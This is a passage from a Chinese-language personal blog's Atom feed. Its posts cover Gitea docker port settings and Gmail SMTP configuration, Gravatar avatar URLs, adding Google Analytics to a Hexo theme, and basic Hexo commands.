+&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#將這段&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;ports:&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;10080:3000&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;10022:22&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#換成這段&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;ports:&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;80:3000&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;22:22&amp;quot;&lt;/span&gt;      &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+        <category term="Self-Hosting" />
+        <category term="Git" />
+        <category term="Gitea" />
+        <updated>2021-11-25T11:22:30.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2021/11/22/gravatar/</id>
+        <title>大頭貼服務 Gravatar</title>
+        <link rel="alternate" href="https://zonego.tw/2021/11/22/gravatar/"/>
+        <content type="html">&lt;p&gt;辦完帳號設定大頭貼是使用大多數服務的必經之路，今天就是要來解決需要重複上串大頭貼的問題! (希望可以…)&lt;/p&gt;
+&lt;h2 id=&#34;Gravatar&#34;&gt;&lt;a href=&#34;#Gravatar&#34; class=&#34;headerlink&#34; title=&#34;Gravatar&#34;&gt;&lt;/a&gt;Gravatar&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://gravatar.com/&#34;&gt;Gravatar&lt;/a&gt; 是多個網站支援的大頭貼服務，Slack、GitHub、WordPress 等大型網站都有支援。&lt;br&gt;只需在這邊設定完大頭貼，就可以一次套用。&lt;/p&gt;
+&lt;p&gt;除了提供大頭貼，Gravatar 也提供類似線上名片的功能。&lt;br&gt;你可以在上面放你的網站、email等公開資訊。 &lt;del&gt;不過我沒在用&lt;/del&gt;&lt;/p&gt;
+&lt;h3 id=&#34;使用大頭貼&#34;&gt;&lt;a href=&#34;#使用大頭貼&#34; class=&#34;headerlink&#34; title=&#34;使用大頭貼&#34;&gt;&lt;/a&gt;使用大頭貼&lt;/h3&gt;&lt;p&gt;參考&lt;a href=&#34;https://en.gravatar.com/site/implement&#34;&gt;官方文件&lt;/a&gt;的使用方法&lt;/p&gt;
+&lt;p&gt;裡面有個方便的用法：取得大頭貼的大頭貼的URL&lt;br&gt;有URL後在，大多數網頁或是可串接網路圖片的地方都可以嵌入&lt;/p&gt;
+&lt;p&gt;&lt;del&gt;如果不能用，一定是你還沒上傳大頭貼&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;大頭貼的網址長這樣，&lt;code&gt;HASH&lt;/code&gt;的部分要替換成email的md5 hash值&lt;/p&gt;
+&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;https:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;www.gravatar.com&lt;span class=&#34;hljs-regexp&#34;&gt;/avatar/&lt;/span&gt;HASH&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;如果不知道怎麼找對應的hash值，可以在&lt;a href=&#34;http://www.md5.cz/&#34;&gt;這裏&lt;/a&gt;產生對應的產生對應的md5 hash&lt;/p&gt;
+&lt;p&gt;例如我email的hash值找到是 &lt;code&gt;0b1d2b9d95375cc6af5909e145fb4a06&lt;/code&gt;&lt;br&gt;我的大頭貼網址就是&lt;/p&gt;
+&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;https&lt;/span&gt;://www.gravatar.com/avatar/&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;95375&lt;/span&gt;cc&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;af&lt;span class=&#34;hljs-number&#34;&gt;5909&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;145&lt;/span&gt;fb&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;06&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://www.gravatar.com/avatar/0b1d2b9d95375cc6af5909e145fb4a06&#34; alt=&#34;大頭貼&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs markdown&#34;&gt;![&lt;span class=&#34;hljs-string&#34;&gt;大頭貼&lt;/span&gt;](&lt;span class=&#34;hljs-link&#34;&gt;https://www.gravatar.com/avatar/0b1d2b9d95375cc6af5909e145fb4a06&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+</content>
+        <category term="網路資源" />
+        <category term="Blog" />
+        <updated>2021-11-22T08:30:59.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2021/11/16/hexo-GA/</id>
+        <title>Hexo nexmoe 主題套用 Google Analytics</title>
+        <link rel="alternate" href="https://zonego.tw/2021/11/16/hexo-GA/"/>
+        <content type="html">&lt;p&gt;Google Analytics（GA）是Google公司提供的數據分析工具，可以幫助你追蹤你的網站流量、用戶行為，是一個網路行銷重要又好用的小工具。&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+
+&lt;p&gt;網路上會看到很多推薦使用 GA 的文章，有甚麼功能就不用我多說了 &lt;del&gt;絕對不是我想偷懶&lt;/del&gt;。&lt;/p&gt;
+&lt;p&gt;我這小小的部落格也就只有看人數的需求而已。&lt;/p&gt;
+&lt;h2 id=&#34;申請-Google-Analytics&#34;&gt;&lt;a href=&#34;#申請-Google-Analytics&#34; class=&#34;headerlink&#34; title=&#34;申請 Google Analytics&#34;&gt;&lt;/a&gt;申請 Google Analytics&lt;/h2&gt;&lt;p&gt;基本上你有 google 帳號就完成一半了，接下來到 &lt;a href=&#34;https://analytics.google.com/analytics/web/&#34;&gt;GA&lt;/a&gt;網站&lt;/p&gt;
+&lt;p&gt;接著在左下角設定 &amp;gt; 建立資源 &amp;gt; 完成後到資料串流&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/ga_resource.jpg&#34; alt=&#34;Google Analytics 資源&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;新增網站串流，裡面填入要分析的網站網址，以及名稱&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/ga_stream.jpg&#34; alt=&#34;Google Analytics 串流&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;完成後我們會得到需要的 &lt;code&gt;評估ID&lt;/code&gt; G-XXXXX 的這串ID&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/ga_stream2.jpg&#34; alt=&#34;Google Analytics 串流&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;修改Hexo設定檔&#34;&gt;&lt;a href=&#34;#修改Hexo設定檔&#34; class=&#34;headerlink&#34; title=&#34;修改Hexo設定檔&#34;&gt;&lt;/a&gt;修改Hexo設定檔&lt;/h2&gt;&lt;p&gt;nexmoe 這個主題有支援 Google Analytics&lt;br&gt;只要在 &lt;code&gt;_config.nexmoe.yml&lt;/code&gt; 設定檔內調整分析的設定即可&lt;/p&gt;
+&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;analytics:&lt;/span&gt; &lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;google_site_id:&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;#&amp;lt;ID&amp;gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;gtags_site_id:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;這邊填入分析ID&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;G-XXXXX&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;cnzz_site_id:&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;#&amp;lt;ID&amp;gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;tencent_site_id:&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;#&amp;lt;ID&amp;gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;la_site_id:&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;#&amp;lt;ID&amp;gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;baidu_site_id:&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;#&amp;lt;ID&amp;gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;gtm_container_id:&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;#&amp;lt;ID&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;成果&#34;&gt;&lt;a href=&#34;#成果&#34; class=&#34;headerlink&#34; title=&#34;成果&#34;&gt;&lt;/a&gt;成果&lt;/h2&gt;&lt;p&gt;設定完後重開 Hexo 伺服器套用&lt;/p&gt;
+&lt;p&gt;在&lt;a href=&#34;https://analytics.google.com/analytics/web/&#34;&gt;GA&lt;/a&gt;網站 &amp;gt; 報表內看到我們要的瀏覽人數&lt;/p&gt;
+&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/ga_dash.jpg&#34; alt=&#34;Google Analytics 報表&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;del&gt;果然人數是0&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;其實是截圖時根本還沒重開 Hexo，所以 Google 根本沒抓到瀏覽紀錄&lt;/p&gt;
+</content>
+        <category term="Google" />
+        <category term="Blog" />
+        <category term="Hexo" />
+        <updated>2021-11-16T07:44:43.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2021/11/14/gitea-gmail/</id>
+        <title>Gitea 使用 Gmail 寄信</title>
+        <link rel="alternate" href="https://zonego.tw/2021/11/14/gitea-gmail/"/>
+        <content type="html">&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+
+&lt;h2 id=&#34;建立-Gmail-應用程式密碼&#34;&gt;&lt;a href=&#34;#建立-Gmail-應用程式密碼&#34; class=&#34;headerlink&#34; title=&#34;建立 Gmail 應用程式密碼&#34;&gt;&lt;/a&gt;建立 Gmail 應用程式密碼&lt;/h2&gt;&lt;p&gt;Google 基於安全性，禁用直接用密碼存取 smtp&lt;br&gt;取而代之要先建立應用程式密碼，代替原本密碼的功能&lt;/p&gt;
+&lt;p&gt;管理 Google 帳戶 &amp;gt; 安全性 &amp;gt; 登入 Google &amp;gt; 應用程式密碼&lt;/p&gt;
+&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/google_account.jpg&#34; alt=&#34;Google Account&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;應用選郵件，裝置只是方便管理的名稱，可以選其他自己寫&lt;/p&gt;
+&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/google_appkey.jpg&#34; alt=&#34;Google APP KEY&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;完成後會產生一組密碼，建議用完之後就忘掉他，下次要用忘記時再建新的就好&lt;/p&gt;
+&lt;h2 id=&#34;設定-container-環境變數&#34;&gt;&lt;a href=&#34;#設定-container-環境變數&#34; class=&#34;headerlink&#34; title=&#34;設定 container 環境變數&#34;&gt;&lt;/a&gt;設定 container 環境變數&lt;/h2&gt;&lt;p&gt;我的 gitea 是使用 Docker 架的&lt;/p&gt;
+&lt;p&gt;gitea 官方鏡像有提供透過環境變數設定，不用另外修改設定檔&lt;/p&gt;
+&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;environment:&lt;br&gt;  - &lt;span class=&#34;hljs-attribute&#34;&gt;GITEA__mailer__ENABLED&lt;/span&gt;=&lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;&lt;br&gt;  - &lt;span class=&#34;hljs-attribute&#34;&gt;GITEA__mailer__FROM&lt;/span&gt;=寄件者信箱&lt;br&gt;  - &lt;span class=&#34;hljs-attribute&#34;&gt;GITEA__mailer__MAILER_TYPE&lt;/span&gt;=smtp&lt;br&gt;  - &lt;span class=&#34;hljs-attribute&#34;&gt;GITEA__mailer__HOST&lt;/span&gt;=smtp.gmail.com:465&lt;br&gt;  - &lt;span class=&#34;hljs-attribute&#34;&gt;GITEA__mailer__IS_TLS_ENABLED&lt;/span&gt;=&lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;&lt;br&gt;  - &lt;span class=&#34;hljs-attribute&#34;&gt;GITEA__mailer__USER&lt;/span&gt;=你的Gmail&lt;br&gt;  - &lt;span class=&#34;hljs-attribute&#34;&gt;GITEA__mailer__PASSWD&lt;/span&gt;=應用程式密碼&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;改完之後到 Gitea 網站 &amp;gt; 網站管理 &amp;gt; 組態&lt;br&gt;往下捲找到 SMTP 組態，可以測試寄信&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.gitea.io/en-us/install-with-docker/#managing-deployments-with-environment-variables&#34;&gt;詳細參考&lt;/a&gt;&lt;/p&gt;
+</content>
+        <category term="Git" />
+        <category term="Gitea" />
+        <category term="Google" />
+        <category term="GMail" />
+        <updated>2021-11-14T04:39:30.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2021/11/13/hexo/</id>
+        <title>Hexo 基本使用教學</title>
+        <link rel="alternate" href="https://zonego.tw/2021/11/13/hexo/"/>
+        <content type="html">&lt;p&gt;&lt;a href=&#34;https://hexo.io/zh-tw/&#34;&gt;官網&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://hexo.io/zh-tw/docs/&#34;&gt;使用說明&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://github.com/hexojs/hexo&#34;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+
+&lt;h2 id=&#34;常用指令&#34;&gt;&lt;a href=&#34;#常用指令&#34; class=&#34;headerlink&#34; title=&#34;常用指令&#34;&gt;&lt;/a&gt;常用指令&lt;/h2&gt;&lt;h3 id=&#34;建新貼文&#34;&gt;&lt;a href=&#34;#建新貼文&#34; class=&#34;headerlink&#34; title=&#34;建新貼文&#34;&gt;&lt;/a&gt;建新貼文&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;hexo new 文章名稱&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;詳細請看: &lt;a href=&#34;https://hexo.io/zh-tw/docs/writing.html&#34;&gt;Writing&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;啟動測試伺服器&#34;&gt;&lt;a href=&#34;#啟動測試伺服器&#34; class=&#34;headerlink&#34; title=&#34;啟動測試伺服器&#34;&gt;&lt;/a&gt;啟動測試伺服器&lt;/h3&gt;&lt;p&gt;Hexo 提供 Web server 功能，不須透過 Nginx 或是 apache&lt;/p&gt;
+&lt;p&gt;安裝&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;npm install hexo-server --save&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;啟動伺服器&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;hexo server&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;詳細請看: &lt;a href=&#34;https://hexo.io/zh-tw/docs/server.html&#34;&gt;Server&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;產生靜態網站檔案&#34;&gt;&lt;a href=&#34;#產生靜態網站檔案&#34; class=&#34;headerlink&#34; title=&#34;產生靜態網站檔案&#34;&gt;&lt;/a&gt;產生靜態網站檔案&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;hexo generate&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;詳細請看: &lt;a href=&#34;https://hexo.io/zh-tw/docs/generating.html&#34;&gt;Generating&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;部署到網站伺服器&#34;&gt;&lt;a href=&#34;#部署到網站伺服器&#34; class=&#34;headerlink&#34; title=&#34;部署到網站伺服器&#34;&gt;&lt;/a&gt;部署到網站伺服器&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;hexo deploy&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;產生靜態頁面後佈署&lt;br&gt;兩個指令相同&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;hexo generate --deploy&lt;br&gt;hexo deploy --generate&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;詳細請看: &lt;a href=&#34;https://hexo.io/zh-tw/docs/one-command-deployment.html&#34;&gt;Deployment&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;增加文章分類-Categories&#34;&gt;&lt;a href=&#34;#增加文章分類-Categories&#34; class=&#34;headerlink&#34; title=&#34;增加文章分類 (Categories)&#34;&gt;&lt;/a&gt;增加文章分類 (Categories)&lt;/h2&gt;&lt;p&gt;指令開啟分類功能&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;hexo new page categories&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;新文章增加分類，只要在新貼文的標頭加上 &lt;code&gt;categories&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs markdown&#34;&gt;---&lt;br&gt;title: 2021-11-00&lt;br&gt;date: 2021-11-00 10:10&lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;categories: 這裡寫分類&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;---&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;增加文章標籤-Tags&#34;&gt;&lt;a href=&#34;#增加文章標籤-Tags&#34; class=&#34;headerlink&#34; title=&#34;增加文章標籤 (Tags)&#34;&gt;&lt;/a&gt;增加文章標籤 (Tags)&lt;/h2&gt;&lt;p&gt;指令開啟標籤功能&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;hexo new page tags&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;新文章增加標籤，也是在新貼文的標頭加上 &lt;code&gt;tags&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight markdown&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs markdown&#34;&gt;---&lt;br&gt;title: 2021-11-00&lt;br&gt;date: 2021-11-00 10:10&lt;br&gt;tags: &lt;br&gt;&lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; 第一個標籤&lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;- 第二個標籤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-section&#34;&gt;---&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;修改新文章預設標頭&#34;&gt;&lt;a href=&#34;#修改新文章預設標頭&#34; class=&#34;headerlink&#34; title=&#34;修改新文章預設標頭&#34;&gt;&lt;/a&gt;修改新文章預設標頭&lt;/h2&gt;&lt;p&gt;修改 &lt;code&gt;scaffolds/post.md&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs marddown&#34;&gt;title: &amp;#123;&amp;#123; title &amp;#125;&amp;#125;&lt;br&gt;date: &amp;#123;&amp;#123; date &amp;#125;&amp;#125;&lt;br&gt;categories: &amp;#123;&amp;#123; categories &amp;#125;&amp;#125;&lt;br&gt;tags: &amp;#123;&amp;#123; tags &amp;#125;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;這樣每次新增文章就會自動添加分類及標籤&lt;/p&gt;
+</content>
+        <category term="Self-Hosting" />
+        <category term="Blog" />
+        <category term="Hexo" />
+        <updated>2021-11-13T04:30:30.000Z</updated>
+    </entry>
+</feed>
